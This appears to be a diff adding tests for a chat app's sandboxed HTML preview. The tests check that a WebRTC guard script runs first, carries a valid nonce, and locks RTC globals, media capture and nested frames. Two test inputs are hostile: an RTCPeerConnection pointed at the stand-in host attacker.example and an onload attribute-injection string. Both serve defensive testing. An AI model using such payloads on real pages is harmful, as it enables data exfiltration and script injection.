@@ -4,6 +4,8 @@ import test from "node:test";
 import {
   HTML_PREVIEW_CDN_HOSTS,
   HTML_PREVIEW_CSP,
+  HTML_PREVIEW_GUARD_SCRIPT,
+  HTML_PREVIEW_WEBRTC_GLOBALS,
   HTML_PREVIEW_MAX_BYTES,
   HTML_PREVIEW_OUTER_CSP,
   HTML_PREVIEW_SANDBOX,
@@ -109,6 +111,49 @@ test("the page's own doctype is replaced by ours so the frame does not fall into
   assert.ok(inner.endsWith("<html><body>x</body></html>"));
   // A doctype that is not at the start is the page's content and is left alone.
   assert.equal(split(buildHtmlPreviewSrcdoc("<p>a</p><!doctype html>")).inner.match(/<!doctype/gi).length, 2);
+});
+
+test("the policy also declares CSP3's WebRTC switch, which applies the day a browser enforces it", () => {
+  assert.deepEqual(directives["webrtc"], ["'block'"]);
+});
+
+test("the WebRTC guard runs right after our policy and before anything the page says", () => {
+  const hostile = `<script>new RTCPeerConnection({ iceServers: [{ urls: "stun:attacker.example:3478" }] })</script>`;
+  const { inner } = split(buildHtmlPreviewSrcdoc(hostile));
+  const head = `<!doctype html><meta http-equiv="Content-Security-Policy" content="${HTML_PREVIEW_CSP}">`;
+  assert.ok(inner.startsWith(`${head}<script>${HTML_PREVIEW_GUARD_SCRIPT}</script>`));
+  assert.ok(inner.endsWith(hostile));
+  assert.ok(inner.indexOf(HTML_PREVIEW_GUARD_SCRIPT) < inner.indexOf("new RTCPeerConnection"));
+});
+
+test("in the chat the guard carries the embedding document's nonce, or the app's policy would block it", () => {
+  const { inner } = split(buildHtmlPreviewSrcdoc("<p>x</p>", null, { nonce: "bm9uY2UtdmFsdWU=" }));
+  assert.ok(inner.includes(`<script nonce="bm9uY2UtdmFsdWU=">${HTML_PREVIEW_GUARD_SCRIPT}</script>`));
+  // A value that is not a nonce is not written into the attribute.
+  for (const bad of ['x" onload="alert(1)', "short", ""]) {
+    const { inner: plain } = split(buildHtmlPreviewSrcdoc("<p>x</p>", null, { nonce: bad }));
+    assert.ok(plain.includes(`<script>${HTML_PREVIEW_GUARD_SCRIPT}</script>`), bad);
+  }
+});
+
+test("the guard locks every WebRTC name, media capture and nested frames, with functions it captured first", () => {
+  for (const name of [
+    "RTCPeerConnection", "webkitRTCPeerConnection", "RTCDataChannel", "RTCSessionDescription", "RTCIceCandidate",
+    "RTCRtpSender", "RTCRtpReceiver", "RTCRtpTransceiver", "RTCDtlsTransport", "RTCIceTransport", "RTCSctpTransport",
+    "MediaStreamTrack",
+  ]) {
+    assert.ok(HTML_PREVIEW_WEBRTC_GLOBALS.includes(name), name);
+  }
+  assert.match(HTML_PREVIEW_GUARD_SCRIPT, /configurable: false/);
+  assert.match(HTML_PREVIEW_GUARD_SCRIPT, /\/\^\(webkit\|moz\)\?RTC\//, "every RTC global, not only the listed ones");
+  assert.match(HTML_PREVIEW_GUARD_SCRIPT, /mediaDevices/);
+  assert.match(HTML_PREVIEW_GUARD_SCRIPT, /iframe,frame,frameset,object,embed/);
+  assert.match(HTML_PREVIEW_GUARD_SCRIPT, /contentWindow/);
+  // Same text in source, in srcdoc and at runtime, and it cannot end its own element early.
+  assert.ok(!HTML_PREVIEW_GUARD_SCRIPT.includes("\\"));
+  assert.ok(!/<\/script/i.test(HTML_PREVIEW_GUARD_SCRIPT));
+  // It parses as a script.
+  assert.doesNotThrow(() => new Function(HTML_PREVIEW_GUARD_SCRIPT));
 });
 
 test("a policy the page adds cannot widen ours: ours stays first and unmodified", () => {
